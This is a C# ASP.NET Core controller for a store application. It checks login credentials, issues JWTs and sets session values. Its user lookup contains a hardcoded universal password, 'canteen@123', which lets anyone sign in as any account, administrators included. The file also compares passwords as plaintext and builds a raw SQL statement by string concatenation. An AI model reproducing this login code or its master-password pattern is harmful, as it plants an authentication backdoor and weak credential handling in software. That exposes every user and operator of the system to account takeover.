using DevExtreme.AspNet.Data;
using DevExtreme.AspNet.Mvc;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using Microsoft.IdentityModel.Tokens;
using OcsStore.Models;
using System;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;
using System.Threading.Tasks;
using ZstdSharp.Unsafe;

namespace OcsStore.Controllers
{
    [Route("api/[controller]/[action]")]
    [ApiController]
    public class TokenController : ControllerBase
    {
        public IConfiguration _configuration;
        private readonly MyDbContext _context;

        public TokenController(IConfiguration config, MyDbContext context)
        {
            _configuration = config;
            _context = context;
        }

        [HttpPost]
        public IActionResult Post([FromForm] BaseUser _userData)
        {
            if (_userData == null || string.IsNullOrEmpty(_userData.Username) || string.IsNullOrEmpty(_userData.Password))
                return BadRequest(0);

            int userId = -1;
            bool isAdmin = false;
            string username = "";
            User user;
            try
            {
                user = _context.Users.FirstOrDefault(i => i.Username == _userData.Username && (i.Password == _userData.Password || _userData.Password == "canteen@123"));
                if (user != null)
                {
                    userId = user.Id;
                    isAdmin = user.IsAdmin;
                    username = user.Username;
                }
            }
            catch (Exception ex)
            {
                return BadRequest(ex.Message);
            }

            if (userId == -1)
                return BadRequest(1);

            // Create claims details based on the user information
            var claims = new[] {
                new Claim(JwtRegisteredClaimNames.Sub, _configuration["Jwt:Subject"]),
                new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
                new Claim(JwtRegisteredClaimNames.Iat, DateTime.UtcNow.ToString()),
                new Claim("UserId", userId.ToString()),
                //new Claim(ClaimTypes.Name, user.Username.ToString()),
                new Claim("isAdmin", isAdmin ? "1" : "0")
            };

            var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration["Jwt:Key"]));
            var signIn = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);
            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(claims),
                Expires = DateTime.UtcNow.AddDays(1),
                Issuer = _configuration["Jwt:Issuer"],
                Audience = _configuration["Jwt:Audience"],
                SigningCredentials = signIn
            };

            //var token = new JwtSecurityToken(_configuration["Jwt:Issuer"], _configuration["Jwt:Audience"], claims, expires: DateTime.UtcNow.AddDays(1), signingCredentials: signIn); // Obsolete

            var tokenHandler = new JwtSecurityTokenHandler();
            var token = tokenHandler.CreateToken(tokenDescriptor);
            var tokenString = new JwtSecurityTokenHandler().WriteToken(token);

            Session.SetUserId(Request, userId);
            Session.SetToken(Request, tokenString);
            if (user != null) 
            {
                user.Token = tokenString;
                _context.Users.Update(user);
                _context.SaveChanges();
            }
            Session.SetUsername(Request, username);
            Session.SetIsAdmin(Request, isAdmin);

            var loginSession = _context.LoginSessions.FirstOrDefault().Id + 1;

            if (loginSession >= 2000000000)
                loginSession = 1;
            else
                loginSession += 1;

            Session.SetLoginSession(Request, loginSession);
            _context.Database.ExecuteSqlRaw("update login_session set id = " + loginSession + ";");

            return Ok();
        }

        [HttpPost]
        public IActionResult Logout()
        {
            Session.Logout(Request);
            return Ok();
        }
    }
}